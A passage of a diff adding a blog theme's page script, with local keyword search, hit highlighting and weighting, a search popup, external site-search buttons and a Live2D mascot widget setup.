+                    if (hit.index === index && hit.word.length < word.length) {
+                      hit.word = word;
+                      hasMatch = true;
+                    }
+                  });
+                  startIndex = index + word.length;
+                  !hasMatch && result.push({ index: index, word: word, weight: weight });
+                }
+                return result;
+              }
+              titleHitSlice = titleHitSlice.concat(getIndexByword(keyword, titleLower, false, WEIGHT.title));
+              contentHitSlice = contentHitSlice.concat(getIndexByword(keyword, contentLower, false, WEIGHT.content));
+            });
+
+            var hitTitle = titleHitSlice.length;
+            var hitContent = contentHitSlice.length;
+
+            if (hitTitle > 0 || hitContent > 0) {
+              isMatch = true;
+            }
+            if (isMatch) {
+              ;[titleHitSlice, contentHitSlice].forEach(function (hit) {
+                // 按照匹配文字的索引的递增顺序排序
+                hit.sort(function (left, right) {
+                  return left.index - right.index;
+                });
+              });
+              /**
+              * 给文本中匹配到的关键词添加标记，从而进行高亮显示
+              * @param {String} text 原文本
+              * @param {Array} hitSlice 匹配项的索引信息
+              * @param {Number} start 开始索引
+              * @param {Number} end 结束索引
+              * @return {String}
+              */
+              function highlightKeyword (text, hitSlice, start, end) {
+                if (!text || !hitSlice || !hitSlice.length) {
+                  return;
+                }
+
+                var result = '';
+                var startIndex = start;
+                var endIndex = end;
+                hitSlice.forEach(function (hit) {
+                  if (hit.index < startIndex) {
+                    return;
+                  }
+
+                  var hitWordEnd = hit.index + hit.word.length;
+                  result += text.slice(startIndex, hit.index);
+                  result += '<b>' + text.slice(hit.index, hitWordEnd) + '</b>';
+                  startIndex = hitWordEnd;
+                });
+                result += text.slice(startIndex, endIndex);
+                return result;
+              }
+
+              var postData = {};
+              // 文章总的搜索权重
+              var postWeight = titleHitSlice.length * WEIGHT.title + contentHitSlice.length * WEIGHT.content;
+              // 标记匹配关键词后的标题
+              var postTitle = highlightKeyword(title, titleHitSlice, 0, title.length) || title;
+              // 标记匹配关键词后的内容
+              var postContent;
+              // 显示内容的长度
+              var SHOW_WORD_LENGTH = 200;
+              // 命中关键词前的字符显示长度
+              var SHOW_WORD_FRONT_LENGTH = 20;
+              var SHOW_WORD_END_LENGTH = SHOW_WORD_LENGTH - SHOW_WORD_FRONT_LENGTH;
+
+              // 截取匹配的第一个字符，前后共 200 个字符来显示
+              if (contentHitSlice.length > 0) {
+                var firstIndex = contentHitSlice[0].index;
+                var start = firstIndex > SHOW_WORD_FRONT_LENGTH ? firstIndex - SHOW_WORD_FRONT_LENGTH : 0;
+                var end = firstIndex + SHOW_WORD_END_LENGTH;
+                postContent = highlightKeyword(content, contentHitSlice, start, end);
+              } else { // 未匹配到内容，直接截取前 200 个字符来显示
+                postContent = content.slice(0, SHOW_WORD_LENGTH);
+              }
+              postData.title = postTitle;
+              postData.content = postContent;
+              postData.url = postURL;
+              postData.weight = postWeight;
+              matchPosts.push(postData);
+            }
+          });
+        }
+
+        var resultInnerHtml = '';
+        if (matchPosts.length) {
+          // 按权重递增的顺序排序，使权重大的优先显示
+          matchPosts.sort(function (left, right) {
+            return right.weight - left.weight;
+          });
+          resultInnerHtml += '<ul>';
+          matchPosts.forEach(function (post) {
+            resultInnerHtml += '<li><a class="search-results-title" href="' + post.url + '">';
+            resultInnerHtml += post.title;
+            resultInnerHtml += '</a><div class="search-results-content">';
+            resultInnerHtml += post.content;
+            resultInnerHtml += '</div></li>';
+          });
+          resultInnerHtml += '</ul>';
+        } else {
+          resultInnerHtml += '<div class="search-results-none"><i class="far fa-meh"></i></div>';
+        }
+        $result.html(resultInnerHtml);
+      };
+      $input.on('input', searchPost);
+      $input.on('keyup', function (e) {
+        if (e.keyCode === Stun.utils.codeToKeyCode('Enter')) {
+          searchPost();
+        }
+      });
+    }
+  });
+}
+
+function closeSearch () {
+  $('body').css({ overflow: 'auto' });
+  $('.search-popup').css({ display: 'none' });
+  $('.search-mask').css({ display: 'none' });
+}
+
+window.addEventListener('DOMContentLoaded', function () {
+  Stun.utils.pjaxReloadLocalSearch = function () {
+    $('.header-nav-search').on('click', function (e) {
+      e.stopPropagation();
+      $('body').css('overflow', 'hidden');
+      $('.search-popup')
+        .velocity('stop')
+        .velocity('transition.expandIn', {
+          duration: 300,
+          complete: function () {
+            $('.search-popup input').focus();
+          }
+        });
+      $('.search-mask')
+        .velocity('stop')
+        .velocity('transition.fadeIn', {
+          duration: 300
+        });
+
+      initSearch();
+    });
+    $('.search-mask, .search-close').on('click', function () {
+      closeSearch();
+    });
+    $(document).on('keydown', function (e) {
+      // Escape <=> 27
+      if (e.keyCode === Stun.utils.codeToKeyCode('Escape')) {
+        closeSearch();
+      }
+    });
+  };
+
+  Stun.utils.pjaxReloadLocalSearch();
+}, false);
+
+function safeOpenUrl(url) {
+  var newTab = window.open();
+  newTab.opener = null;
+  newTab.location = url;
+}
+
+function extSearch(engine) {
+  var engines = {
+    google: 'https://www.google.com/search?q=',
+    bing: 'https://cn.bing.com/search?q=',
+    baidu: 'https://www.baidu.com/s?ie=UTF-8&wd=',
+  };
+  var host = window.location.host;
+  var query = $('.search-input input').val().toLowerCase().trim();
+  var uri = engines[engine] + query + ' site:' + host;
+
+  if (query) {
+    safeOpenUrl(uri);
+  } else {
+    Stun.utils.popAlert('warning', 'Please enter characters');
+  }
+}
+
+var assistSearchList = window.CONFIG.assistSearch;
+
+if (Array.isArray(assistSearchList)) {
+  assistSearchList.forEach(function (name) {
+    document.querySelector('.search-btns-item--' + name).addEventListener('click', function () {
+      extSearch(name);
+    }, false);
+  });
+}</script><script src="/js/utils.js?v=2.6.2"></script><script src="/js/stun-boot.js?v=2.6.2"></script><script src="/js/scroll.js?v=2.6.2"></script><script src="/js/header.js?v=2.6.2"></script><script src="/js/sidebar.js?v=2.6.2"></script><script type="application/json" src="/search.json"></script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"scale":1,"hHeadPos":0.5,"vHeadPos":0.618,"jsonPath":"/live2dw/assets/assets/wanko.model.json"},"display":{"superSample":2,"width":150,"height":300,"position":"left","hOffset":0,"vOffset":-80},"mobile":{"show":true,"scale":0.5},"react":{"opacityDefault":0.7,"opacityOnHover":0.8},"log":false});</script></body></html>
